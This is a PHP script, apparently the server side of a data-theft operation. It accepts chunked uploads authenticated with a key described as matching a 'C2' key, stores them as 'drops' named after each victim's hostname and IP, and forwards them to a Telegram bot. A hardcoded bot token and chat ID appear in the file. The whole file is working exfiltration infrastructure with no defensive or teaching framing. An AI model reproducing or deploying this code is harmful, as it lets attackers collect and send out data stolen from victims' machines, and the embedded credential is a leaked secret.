<?php
declare(strict_types=1);

$SECRET = getenv('SECRET') ?: 'CHANGE_ME_9f3a1c7b2d';   // must equal C2_KEY_STR
$BOT    = getenv('BOT')    ?: '9121116193:AAGu2w4wpUFkWufsl6wAT0QL3nhABUFc-0A';
$CHAT   = getenv('CHAT')   ?: '6003299359';

$STORE = getenv('STORE') ?: (sys_get_temp_dir() . '/drops');

if (($_SERVER['HTTP_X_AUTH'] ?? '') !== $SECRET) { http_response_code(403); exit('no'); }

$body = file_get_contents('php://input');
if ($body === '') { http_response_code(400); exit('empty'); }

/* real client IP: proxy header first, REMOTE_ADDR last */
function client_ip(): string {
    $cand = [];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $cand = array_map('trim', explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']));
    }
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        array_unshift($cand, $_SERVER['HTTP_CF_CONNECTING_IP']);
    }
    $cand[] = $_SERVER['REMOTE_ADDR'] ?? '';
    foreach ($cand as $c) {
        if (filter_var($c, FILTER_VALIDATE_IP)) return $c;
    }
    return '0.0.0.0';
}

$ip = client_ip();

$host = @gethostbyaddr($ip) ?: $ip;
$host = preg_replace('/[^A-Za-z0-9_.-]/', '', $host) ?: $ip;

$name = $_SERVER['HTTP_X_NAME'] ?? 'data.txt';
if (!preg_match('/^[A-Za-z0-9_.-]{1,40}\.txt$/', $name)) $name = 'data.txt';

$run    = preg_replace('/[^A-Za-z0-9]/', '', $_SERVER['HTTP_X_RUN'] ?? '') ?: 'r' . time();
$chunk  = max(1, (int)($_SERVER['HTTP_X_CHUNK'] ?? 1));
$chunks = max($chunk, (int)($_SERVER['HTTP_X_CHUNKS'] ?? 1));
$meta   = substr(preg_replace('/[^\x20-\x7E]/', '', $_SERVER['HTTP_X_META'] ?? ''), 0, 200);

$cap = trim(preg_replace('/[\x00-\x1F\x7F]+/', ' ', (string)($_SERVER['HTTP_X_CAPTION'] ?? '')) ?? '');

if ($cap === '') {
    $cip = filter_var($_SERVER['HTTP_X_IP'] ?? '', FILTER_VALIDATE_IP) ?: $ip;
    $cap = "{$host} ({$cip}) — {$name}";
    if ($meta !== '') $cap .= " — {$meta}";
    $cap .= " — chunk {$chunk}/{$chunks}";
}

$cap = function_exists('mb_substr')
    ? mb_substr($cap, 0, 1024, 'UTF-8')
    : substr($cap, 0, 1024);

if (!is_dir($STORE)) { @mkdir($STORE, 0750, true); }

$path = sprintf('%s/%s_%s_%s', $STORE, $host, $run, $name);
file_put_contents($path, $body, $chunk > 1 ? FILE_APPEND : 0);

/* answer before the upload so the client never waits on Telegram */
ignore_user_abort(true);
set_time_limit(0);
http_response_code(200);
header('Content-Type: text/plain');
header('Content-Length: 2');
header('Connection: close');
echo 'ok';

if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
} else {
    while (ob_get_level() > 0) { @ob_end_flush(); }
    @flush();
}

if ($chunk < $chunks) {
    /* housekeeping only, cheap */
    foreach (glob($STORE . '/*.txt') ?: [] as $f) {
        if (@filemtime($f) < time() - 7 * 86400) @unlink($f);
    }
    exit;
}

$ok = false;
if (function_exists('curl_init')) {
    $ch = curl_init("https://api.telegram.org/bot{$BOT}/sendDocument");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 120,
        CURLOPT_POSTFIELDS     => [
            'chat_id'  => $CHAT,
            'caption'  => $cap,
            'document' => new CURLFile($path, 'text/plain', $name),
        ],
    ]);
    curl_exec($ch);
    $ok = curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200;
    curl_close($ch);
}

if (!$ok && $chunks === 1 && strlen($body) < 3500) {
    $ch = curl_init("https://api.telegram.org/bot{$BOT}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 20,
        CURLOPT_POSTFIELDS => ['chat_id' => $CHAT, 'text' => "$cap\n\n$body"],
    ]);
    curl_exec($ch);
    curl_close($ch);
}

foreach (glob($STORE . '/*.txt') ?: [] as $f) {
    if (@filemtime($f) < time() - 7 * 86400) @unlink($f);
}
